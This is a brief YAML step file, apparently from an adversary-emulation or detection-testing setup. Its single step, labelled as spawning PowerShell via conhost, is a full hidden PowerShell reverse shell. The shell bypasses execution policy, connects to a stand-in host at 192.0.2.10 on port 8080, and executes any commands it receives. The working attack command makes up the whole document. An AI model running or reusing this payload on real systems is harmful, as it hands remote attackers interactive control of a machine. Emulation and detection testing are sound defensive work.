steps:
- id: step-01
  name: Spawn PowerShell via Conhost
  command: powershell.exe -NoP -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('192.0.2.10',8080);$stream
    = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length))
    -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback
    = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendback2_bytes
    = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendback2_bytes,0,$sendback2_bytes.Length);$stream.Flush()};$client.Close()"
